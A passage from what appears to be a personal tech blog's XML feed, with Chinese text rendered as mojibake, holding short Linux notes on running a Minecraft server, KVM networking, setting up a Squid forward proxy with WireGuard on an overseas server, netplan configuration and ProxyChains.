minecraft_server.1.19.2.jar<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ç‰ˆæœ¬å·éœ€è‡ªå·±æŸ¥çœ‹.</p><p>è¿è¡Œ:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ java -Xmx1024M -Xms1024M -jar minecraft_server.1.19.2.jar nogui<br></code></pre></td></tr></table></figure><p>å¦‚æœå‡ºç° <code>EULA</code> (End User License Agreement) æŠ¥é”™åˆ™ä¸‹ä¸€æ­¥.</p><h2 id="6-æ¥å—-Minecraftâ€™s-EULA"><a href="#6-æ¥å—-Minecraftâ€™s-EULA" class="headerlink" title="6. æ¥å— Minecraftâ€™s EULA"></a>6. æ¥å— Minecraftâ€™s EULA</h2><p>åœ¨ä½ ä¹‹å‰è¿è¡Œäº†:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ java -Xmx1024M -Xms1024M -jar minecraft_server.1.19.2.jar nogui<br></code></pre></td></tr></table></figure><p>ä¹‹å, å½“å‰ç›®å½•ä¼šå¤šå‡ºå‡ ä¸ªæ–‡ä»¶å’Œç›®å½•:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p>ç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€ <code>eula.txt</code> è¿™ä¸ªæ–‡ä»¶. è¿™ä¸ªæ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªé“¾æ¥, èƒ½å¤Ÿ takes you to the Minecraft end user license agreement, æŸ¥çœ‹ç½‘é¡µå†…å®¹å, è‹¥åŒæ„, åˆ™ä¿®æ”¹ <code>eula.txt</code> ä¸­çš„ <code>eula=false</code> ä¸º <code>eula=ture</code>.</p><h2 id="7-è¿è¡Œ-screen"><a href="#7-è¿è¡Œ-screen" class="headerlink" title="7. è¿è¡Œ screen"></a>7. è¿è¡Œ screen</h2><p>ç”¨ screen å¼€å¯ä¸€ä¸ª session, æ·»åŠ  <code>-S</code> é€‰é¡¹æ¥å‘½å:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ screen -S <span class="hljs-string">&quot;Minecraft server&quot;</span><br></code></pre></td></tr></table></figure><h2 id="8-è¿è¡Œ-Minecraft-Server"><a href="#8-è¿è¡Œ-Minecraft-Server" class="headerlink" title="8. è¿è¡Œ Minecraft Server"></a>8. è¿è¡Œ Minecraft Server</h2><p>å†æ¬¡è¿è¡Œä¹‹å‰çš„å‘½ä»¤:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ java -Xmx1024M -Xms1024M -jar minecraft_server.1.19.2.jar nogui<br></code></pre></td></tr></table></figure><p>å¦‚æœå¾—åˆ° <code>Done!</code> çš„æç¤º, åˆ™æˆåŠŸè¿è¡Œ.</p><p>å¯é€šè¿‡ä¿®æ”¹ <code>server.properties</code> æ–‡ä»¶è®¾ç½®é»˜è®¤é…ç½®.</p><h2 id="9-é…ç½®é˜²ç«å¢™"><a href="#9-é…ç½®é˜²ç«å¢™" class="headerlink" title="9. é…ç½®é˜²ç«å¢™"></a>9. é…ç½®é˜²ç«å¢™</h2><p>Minecraft é»˜è®¤ä½¿ç”¨ 25565 ç«¯å£.</p><p>Enable port forwarding for ufw:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ufw allow 25565<br></code></pre></td></tr></table></figure><p>è‹¥ä½¿ç”¨ iptables åˆ™:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ iptables -I INPUT -p tcp --dport 25565 -j ACCEPT<br>$ iptables-save &gt;/etc/sysconfig/iptables<br></code></pre></td></tr></table></figure><h2 id="10-è®¾ç½®åŸŸå"><a href="#10-è®¾ç½®åŸŸå" class="headerlink" title="10. è®¾ç½®åŸŸå"></a>10. è®¾ç½®åŸŸå</h2><p><a href="https://phoenixnap.com/kb/what-is-domain-name-system-works">æ›´æ–° domainâ€™s DNS records å‚è€ƒ</a></p><h1 id="å®˜æ–¹æ•™ç¨‹"><a href="#å®˜æ–¹æ•™ç¨‹" class="headerlink" title="å®˜æ–¹æ•™ç¨‹"></a><a href="https://minecraft.fandom.com/wiki/Tutorials/Setting_up_a_server">å®˜æ–¹æ•™ç¨‹</a></h1><h1 id="B-ç«™æ•™ç¨‹"><a href="#B-ç«™æ•™ç¨‹" class="headerlink" title="B ç«™æ•™ç¨‹"></a><a href="https://www.bilibili.com/video/BV1pa411G7zy/?is_story_h5=false&p=1&share_from=ugc&share_medium=ipad&share_plat=ios&share_source=COPY&share_tag=s_i&timestamp=1666144523&unique_k=4YJSPJ5&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">B ç«™æ•™ç¨‹</a></h1>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>KVM-è™šæ‹Ÿæœºå’Œæœ¬æœºæ²Ÿé€š</title>
    <link href="/2022/10/18/KVM-%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%92%8C%E6%9C%AC%E6%9C%BA%E6%B2%9F%E9%80%9A/"/>
    <url>/2022/10/18/KVM-%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%92%8C%E6%9C%AC%E6%9C%BA%E6%B2%9F%E9%80%9A/</url>
    
    <content type="html"><![CDATA[<p><a href="https://getlabsdone.com/how-to-connect-kvm-vm-to-host-network/">å‚è€ƒ</a></p><p>åœ¨éƒ¨ç½²ä¸€ä¸ª KVM è™šæ‹Ÿæœºä¹‹å, å…¶ä¼šè‡ªåŠ¨è¿æ¥ä¸€ä¸ª default virtual network, acting as a NAT interface. è¿™æ ·, è™šæ‹Ÿæœºæ‰èƒ½å’Œä¸Šç½‘. ä½†æ˜¯ä¸èƒ½ä½¿ç”¨ SSH ç›´æ¥è¿æ¥. å› ä¸ºè™šæ‹Ÿæœºç›¸å½“äºåœ¨å†…ç½‘.</p><p>éœ€è¦ä½¿ç”¨ä¸€ä¸ª bridge interface for the Local network.</p><h2 id="KVM-ä¸­çš„-bridge-interface"><a href="#KVM-ä¸­çš„-bridge-interface" class="headerlink" title="KVM ä¸­çš„ bridge interface"></a>KVM ä¸­çš„ bridge interface</h2>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Fix-Linux-Unsupported-proxy-configured</title>
    <link href="/2022/10/17/Fix-Linux-Unsupported-proxy-configured/"/>
    <url>/2022/10/17/Fix-Linux-Unsupported-proxy-configured/</url>
    
    <content type="html"><![CDATA[<p><a href="https://stackoverflow.com/questions/50236188/linux-unsupported-proxy-configured">å‚è€ƒ</a></p><p>ä½¿ç”¨ <code>export http_proxy=</code> æ—¶, åé¢çš„æ ¼å¼åº”è¯¥å¦‚ <code>http://127.0.0.1:8888/</code>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">export</span> http_proxy=<span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç§‘å­¦ä¸Šç½‘æ­å»ºæ€»ç»“</title>
    <link href="/2022/10/17/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%90%AD%E5%BB%BA%E6%80%BB%E7%BB%93/"/>
    <url>/2022/10/17/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%90%AD%E5%BB%BA%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h1><p>ä¸»è¦éœ€è¦ç”¨åˆ°:</p><ul><li>å¢ƒå¤–æœåŠ¡å™¨ (æ‰¿è½½ wireguard docker å’Œ squid ä»£ç†æœåŠ¡å™¨)</li><li>wireguard å®ç°å†…ç½‘ç©¿é€ (å¯¹äºç”µè„‘æ²¡æœ‰å…¬ç½‘ IP)</li><li>squid ä»£ç† http è¯·æ±‚ (ç”¨æ¥è½¬å‘è¯·æ±‚)</li></ul><h2 id="1-å¢ƒå¤–æœåŠ¡å™¨"><a href="#1-å¢ƒå¤–æœåŠ¡å™¨" class="headerlink" title="1. å¢ƒå¤–æœåŠ¡å™¨"></a>1. å¢ƒå¤–æœåŠ¡å™¨</h2><p>æˆ‘è¿™é‡Œç”¨çš„æ˜¯è…¾è®¯äº‘çš„è½»é‡åº”ç”¨æœåŠ¡å™¨, é€‰çš„æ˜¯æ–°åŠ å¡çš„æœåŠ¡å™¨ (é¦™æ¸¯çš„å”®ç©ºäº†), å¤§æ¦‚æ˜¯è¿™ä¸ªç•Œé¢:</p><p><img src="/../img/purchase_server.png"></p><p>ç„¶åè¿›å…¥è‡ªå·±çš„æ§åˆ¶å°:<br><img src="/../img/enter_console.png"></p><p>ä¸‹æ–¹ä¼šæœ‰è‡ªå·±åˆ›å»ºå¥½çš„æœåŠ¡å™¨:<br><img src="/../img/where_server_is.pmg.png"></p><p>æ—è¾¹çš„æ›´å¤šé‡Œé¢æœ‰å¾ˆå¤šé€‰é¡¹.</p><h2 id="2-wireguard"><a href="#2-wireguard" class="headerlink" title="2. wireguard"></a>2. wireguard</h2><p>è¿™é‡Œä½¿ç”¨æ›´ä¸ºç®€ä¾¿çš„ docker æ­å»º wireguard æœåŠ¡å™¨.</p><p>å·¥å…·ä¸º wg-easy, å¯ä»¥åœ¨ <a href="https://github.com/WeeJeWel/wg-easy">github</a> ä¸Šæ‰¾åˆ°ç›¸å…³é¡µé¢.</p><p>æ­å»ºè¿‡ç¨‹å‚è€ƒ <a href="https://gitee.com/spoto/wireguard">è¿™ç¯‡åšæ–‡</a>, ä»¥åŠä½œè€…åœ¨ <a href="https://www.bilibili.com/video/BV1uT411w7Tq/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">B ç«™çš„æ•™å­¦è§†é¢‘</a>.</p><p>æ³¨æ„è¦ç»™äº‘æœåŠ¡å™¨æœ¬èº«ä¹Ÿæ·»åŠ ä¸€ä¸ª client, å› ä¸º wireguard æœåŠ¡å™¨åœ¨ docker ä¸Š.</p><h2 id="3-squid"><a href="#3-squid" class="headerlink" title="3. squid"></a>3. squid</h2><p>å…·ä½“å‚è€ƒ &lt;&lt;é¸Ÿå“¥çš„ Linux ç§æˆ¿èœæœåŠ¡å™¨æ¶è®¾ç¯‡&gt;&gt;.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨-squid-ä»£ç†æ—¶-curl-æŠ¥é”™-Connection-reset-by-peer</title>
    <link href="/2022/10/17/%E4%BD%BF%E7%94%A8-squid-%E4%BB%A3%E7%90%86%E6%97%B6-curl-%E6%8A%A5%E9%94%99-Connection-reset-by-peer/"/>
    <url>/2022/10/17/%E4%BD%BF%E7%94%A8-squid-%E4%BB%A3%E7%90%86%E6%97%B6-curl-%E6%8A%A5%E9%94%99-Connection-reset-by-peer/</url>
    
    <content type="html"><![CDATA[<p>å°†åŸæœ¬çš„:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> å…¬ç½‘IP:ç«¯å£<br></code></pre></td></tr></table></figure><p>æ”¹ä¸º:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> å†…ç½‘ç©¿é€è™šæ‹ŸIP:ç«¯å£<br></code></pre></td></tr></table></figure><p>å°±å¥½äº†.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å¯ç”¨-wg0-æ—¶æŠ¥é”™</title>
    <link href="/2022/10/17/%E5%90%AF%E7%94%A8-wg0-%E6%97%B6%E6%8A%A5%E9%94%99/"/>
    <url>/2022/10/17/%E5%90%AF%E7%94%A8-wg0-%E6%97%B6%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯-NBD-ä»¥åŠå¦‚ä½•ä½¿ç”¨</title>
    <link href="/2022/10/16/%E4%BB%80%E4%B9%88%E6%98%AF-NBD-%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/16/%E4%BB%80%E4%B9%88%E6%98%AF-NBD-%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/50460919">å‚è€ƒ</a></p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>NBD æ˜¯ Network Block Device çš„ç®€ç§°. </p><p>NBD èƒ½è®©ç”¨æˆ·é€šè¿‡ç½‘ç»œè®¿é—®åˆ°æŸä¸ªå—è®¾å¤‡, æˆ–è€…è®¾å¤‡é•œåƒ.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æŸ¥çœ‹æŸä¸ªç«¯å£è¢«å“ªä¸€ä¸ªè¿›ç¨‹å ç”¨</title>
    <link href="/2022/10/16/%E6%9F%A5%E7%9C%8B%E6%9F%90%E4%B8%AA%E7%AB%AF%E5%8F%A3%E8%A2%AB%E5%93%AA%E4%B8%80%E4%B8%AA%E8%BF%9B%E7%A8%8B%E5%8D%A0%E7%94%A8/"/>
    <url>/2022/10/16/%E6%9F%A5%E7%9C%8B%E6%9F%90%E4%B8%AA%E7%AB%AF%E5%8F%A3%E8%A2%AB%E5%93%AA%E4%B8%80%E4%B8%AA%E8%BF%9B%E7%A8%8B%E5%8D%A0%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.yisu.com/zixun/311818.html">å‚è€ƒ</a><br>ä½¿ç”¨ <code>lsof</code> (list open file) å‘½ä»¤.</p><p>å®‰è£…, Arch ä¸­ç›´æ¥å®‰è£… <code>sudo pacman -S lsof</code>.</p><p>ä½¿ç”¨, å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ lsof -i :80<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-netplan</title>
    <link href="/2022/10/16/%E5%85%B3%E4%BA%8E-netplan/"/>
    <url>/2022/10/16/%E5%85%B3%E4%BA%8E-netplan/</url>
    
    <content type="html"><![CDATA[<p><a href="https://juejin.cn/post/7139049944903581732">å‚è€ƒ</a></p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>Netplan æ˜¯å‘½ä»¤è¡Œä¸‹çš„ç½‘ç»œé…ç½®ç¨‹åº. å…¶å…è®¸ç”¨ YAML æ¥é…ç½®ç½‘ç»œæ¥å£, å¯ä¸ NetworkManager å’Œ systemd-networkd ç½‘ç»œå®ˆæŠ¤è¿›ç¨‹ä¸€èµ·ä½œä¸ºå†…æ ¸æ¥å£.</p><p>å…¶è¯»å– <code>/etc/netplan/</code> ä¸‹çš„ç½‘ç»œæè¿°.</p><p>å¯åœ¨ <code>man netplan</code> ä¸‹æŸ¥çœ‹é…ç½®æ–‡ä»¶ç›¸å…³å†…å®¹.</p><p>å‚è€ƒç¤ºä¾‹é…ç½®:</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">network:</span><br><span class="hljs-comment"># ç‰ˆæœ¬å·,å¯ä»¥ä¸å†™</span><br><span class="hljs-attr">version:</span> <span class="hljs-number">2</span> <br><span class="hljs-comment"># å¯ä»¥ä¸å†™</span><br><span class="hljs-attr">renderer:</span> <span class="hljs-string">networkd</span><br><span class="hljs-attr">ethernets:</span><br><span class="hljs-attr">ens33:</span>   <span class="hljs-comment">#é…ç½®çš„ç½‘å¡åç§°</span><br><span class="hljs-attr">dhcp4:</span> <span class="hljs-literal">no</span>    <span class="hljs-comment">#dhcp4å…³é—­</span><br><span class="hljs-attr">dhcp6:</span> <span class="hljs-literal">no</span>    <span class="hljs-comment">#dhcp6å…³é—­</span><br><span class="hljs-attr">addresses:</span> [<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.55</span><span class="hljs-string">/24</span>]   <span class="hljs-comment">#è®¾ç½®æœ¬æœºIPåŠæ©ç </span><br><span class="hljs-attr">gateway4:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.254</span>   <span class="hljs-comment">#è®¾ç½®ç½‘å…³</span><br><span class="hljs-attr">nameservers:</span><br><span class="hljs-attr">addresses:</span> [<span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span>, <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span>]   <span class="hljs-comment">#è®¾ç½®DNS</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>squid-æ­£å‘ä»£ç†</title>
    <link href="/2022/10/16/squid-%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/"/>
    <url>/2022/10/16/squid-%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1q5411Y7MW/?spm_id_from=trigger_reload&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ</a></p><p>ä¼¼ä¹ç§æœ‰ IP å¯ä»¥éšæ„åˆ†é…, æ˜¯è‡ªå·±å¯æ§çš„. åªæœ‰å…¬ç½‘ IP æ‰æ˜¯ç”±åˆ«äººåˆ†é…çš„.</p><p>ä¸‰ä¸ªä¸Šç½‘çš„æ¡ä»¶:</p><ul><li>IP</li><li>Gateway</li><li>DNS</li></ul><p>å†…ç½‘ä¸­çš„ä¸»æœºè‹¥æ˜¯æƒ³ç”¨ä¸€å°å¤–ç½‘çš„å…·æœ‰å…¬ç½‘ IP çš„ä¸»æœºä½œä¸ºæ­£å‘ä»£ç†æœåŠ¡å™¨, éœ€è¦å…ˆæ­ VPN å®ç°å†…ç½‘ç©¿é€.</p><h1 id="é…ç½®ç½‘å¡"><a href="#é…ç½®ç½‘å¡" class="headerlink" title="é…ç½®ç½‘å¡"></a>é…ç½®ç½‘å¡</h1><p>Ubuntu çš„è·¯å¾„ä¸º <code>/etc/netplan/</code> ç›®å½•ä¸‹, docker å®¹å™¨ä¸­æ— æ­¤è·¯å¾„.</p><p>CentOS çš„è·¯å¾„ä¸º <code>/etc/sysconfig/network-scripts/</code> ç›®å½•ä¸‹.</p><p>éœ€è¦æµ‹è¯•æ˜¯å¦èƒ½å¤Ÿä¸Šç½‘, ä»£ç†æœåŠ¡å™¨æ˜¯éœ€è¦è¿ç½‘çš„.</p><h1 id="å®‰è£…-squid"><a href="#å®‰è£…-squid" class="headerlink" title="å®‰è£… squid"></a>å®‰è£… squid</h1><p>Ubuntu ä¸‹å¯ç›´æ¥:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ apt-get install squid<br></code></pre></td></tr></table></figure><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><p>é…ç½®æ–‡ä»¶ä½äº <code>/etc/squid/squid.conf</code>.</p><p>é‡å¯æœåŠ¡ <code>systemctl restart squid</code>.</p><h3 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h3><p><a href="https://blog.csdn.net/qq_37367124/article/details/88241940">å‚è€ƒ</a></p><p>Ubuntu ä¸­ä½äº 1188 è¡Œ.</p><p>é…ç½®æ–‡ä»¶ä¸­å‘½ä»¤ <code>acl</code> çš„å«ä¹‰æ˜¯ Access Control List. å…¶ç”¨æ¥åœ¨æœåŠ¡å™¨ç«¯è®¾å®šç‰¹å®šçš„ä¸Šç½‘ç­–ç•¥, å“ªäº›ç”¨æˆ·èƒ½ä¸Šç½‘, èƒ½è®¿é—®ä»€ä¹ˆç½‘ç«™, èƒ½ä¸‹è½½ä»€ä¹ˆæ–‡ä»¶ç­‰ç­‰å¯¹ç”¨æˆ·çš„ä¸Šç½‘è¡Œä¸ºè¿›è¡Œçº¦æŸå’Œç®¡ç†.</p><p>ACL ç”±å¤šä¸ªç­–ç•¥è§„åˆ™ç»„æˆ, å®ƒå¯ä»¥æ ¹æ®æŒ‡å®šçš„ç­–ç•¥è§„åˆ™æ¥å…è®¸æˆ–é™åˆ¶è®¿é—®è¯·æ±‚, åŒ¹é…é¡ºåºç”±ä¸Šè‡³ä¸‹. ä¸€æ—¦å½¢æˆåŒ¹é…, åˆ™ç«‹å³æ‰§è¡Œç›¸åº”æ“ä½œå¹¶ç»“æŸåŒ¹é…è¿‡ç¨‹.</p><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><p>å¯ä»¥ç”¨ <code>acl</code> åˆ›å»ºå˜é‡:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">acl</span> allow_user src <span class="hljs-number">192.168.10.1</span>-<span class="hljs-number">192.168.10.50</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå‘½åäº†ä¸€ä¸ª <code>allow_user</code> çš„å˜é‡, åœ°å€èŒƒå›´ä¸º 192.168.10.1-192.168.10.50.</p><p>è®¿é—®æ§åˆ¶:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http_access</span> <span class="hljs-literal">allow</span> allow_user<br><span class="hljs-attribute">http_access</span> <span class="hljs-literal">deny</span> <span class="hljs-literal">all</span><br></code></pre></td></tr></table></figure><p>å…è®¸ <code>allow_user</code> è§„å®šçš„ç”¨æˆ·è¿›è¡Œ http è®¿é—®, æ‹’ç»å…¶ä»–é“¾æ¥çš„è®¿é—®.</p><h3 id="é…ç½®å®¢æˆ·ç«¯çš„æ­£å‘ä»£ç†"><a href="#é…ç½®å®¢æˆ·ç«¯çš„æ­£å‘ä»£ç†" class="headerlink" title="é…ç½®å®¢æˆ·ç«¯çš„æ­£å‘ä»£ç†"></a>é…ç½®å®¢æˆ·ç«¯çš„æ­£å‘ä»£ç†</h3><p>ä¸åŒå®¢æˆ·ç«¯çš„é…ç½®ä¸åŒ.</p><p>é€šè¿‡ <code>netstat -ntpl</code> æŸ¥çœ‹ squid å¼€å¯çš„é»˜è®¤ç«¯å£, ä¹Ÿå¯é€šè¿‡æŸ¥çœ‹å…¶é…ç½®æ–‡ä»¶.</p><p>é€šç”¨é…ç½®, æŒ‡å®šå†…ç½‘ç½‘å¡çš„åœ°å€, ä»¥åŠ squid çš„ç«¯å£.</p><h3 id="Squid-è®¿é—®æ§åˆ¶"><a href="#Squid-è®¿é—®æ§åˆ¶" class="headerlink" title="Squid è®¿é—®æ§åˆ¶"></a>Squid è®¿é—®æ§åˆ¶</h3>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-sysctl.conf-è¿™ä¸ªæ–‡ä»¶</title>
    <link href="/2022/10/16/%E5%85%B3%E4%BA%8E-sysctl.conf-%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6/"/>
    <url>/2022/10/16/%E5%85%B3%E4%BA%8E-sysctl.conf-%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯-ProxyChains</title>
    <link href="/2022/10/16/%E4%BB%80%E4%B9%88%E6%98%AF-ProxyChains/"/>
    <url>/2022/10/16/%E4%BB%80%E4%B9%88%E6%98%AF-ProxyChains/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/11.html">å‚è€ƒ1</a><br><a href="https://blog.csdn.net/freeking101/article/details/70324802">å‚è€ƒ2</a><br><a href="https://github.com/haad/proxychains/wiki">proxychains çš„ github ä¸»é¡µ</a><br><a href="https://github.com/rofl0r/proxychains-ng">proxychains-ng çš„ github ä¸»é¡µ</a></p><p>ProxyChains æ˜¯ Linux å’Œå…¶ä»– Unix ç³»ç»Ÿä¸‹çš„ä»£ç†å·¥å…·, å¯ä»¥ä½¿ä»»ä½•ç¨‹åºé€šè¿‡ä»£ç†ä¸Šç½‘.</p><p>ä¸»è¦æ˜¯ä¸ºäº†åœ¨å‘½ä»¤è¡Œä½¿ç”¨ä»£ç†.</p><p>ProxyChains å¯ä»¥é…ç½®å¤šä¸ªä»£ç†. </p><p>proxychains-ng (new generation) æ˜¯ proxychains çš„å‡çº§ç‰ˆ.</p><p>ProxyChains åªä¼šå°†å½“å‰åº”ç”¨çš„ TCP è¿æ¥è½¬å‘è‡³ä»£ç†, è€Œéå…¨å±€ä»£ç†.</p><h1 id="å®‰è£…-proxychains-ng"><a href="#å®‰è£…-proxychains-ng" class="headerlink" title="å®‰è£… proxychains-ng"></a>å®‰è£… proxychains-ng</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git <span class="hljs-built_in">clone</span> https://github.com/rofl0r/proxychains-ng<br>$ <span class="hljs-built_in">cd</span> proxychains-ng<br>$ ./configure<br>$ sudo make &amp;&amp; make install<br></code></pre></td></tr></table></figure><p>å…¶å®å¯ä»¥ç›´æ¥ç”¨åŒ…ç®¡ç†å™¨ä¸‹è½½:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ apt-get install proxychains-ng<br></code></pre></td></tr></table></figure><h1 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h1><p>é…ç½®æ–‡ä»¶ä½äº: <code>/etc/proxychains.conf</code>.</p><p>å…ˆå–æ¶ˆ <code>dynamic_chain</code> å‰é¢çš„æ³¨é‡Š</p><p>åœ¨æœ«å°¾æ·»åŠ æ·»åŠ ä¸€äº›ä»£ç†æœåŠ¡å™¨åˆ—è¡¨:</p><p>å¦‚:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">6889</span><br><span class="hljs-attribute">socket4</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">9050</span><br><span class="hljs-attribute">socket5</span> <span class="hljs-number">98.206.2.3</span> <span class="hljs-number">1893</span><br></code></pre></td></tr></table></figure><h1 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h1><p>åœ¨å‘½ä»¤å‰åŠ ä¸Š <code>proxychain4</code>, å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ proxychains4 git <span class="hljs-built_in">clone</span> https://github.com/rofl0r/proxychains-ng<br></code></pre></td></tr></table></figure><p>ç”±äº proxychains åªä¼šä»£ç† TCP è¿æ¥, è€Œ ping å‘½ä»¤ä½¿ç”¨çš„æ˜¯ ICMP, å› æ­¤ ping å‘½ä»¤ä¸ä¼šæœ‰æ•ˆæœ.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux-ç»ˆç«¯ä¸‹çš„ä»£ç†</title>
